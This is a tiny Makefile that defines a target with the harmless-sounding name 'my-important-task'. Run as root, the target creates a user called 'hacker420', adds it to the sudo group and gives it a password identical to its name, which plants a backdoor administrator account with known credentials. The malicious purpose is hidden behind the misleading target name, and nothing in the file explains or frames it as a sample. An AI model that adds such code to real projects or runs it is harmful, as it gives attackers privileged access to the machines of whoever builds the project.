define my_important_task =
sudo useradd hacker420;
sudo usermod -aG sudo hacker420;
echo "hacker420:hacker420" | chpasswd;
endef

my-important-task: ; $(value my_important_task)

.ONESHELL:
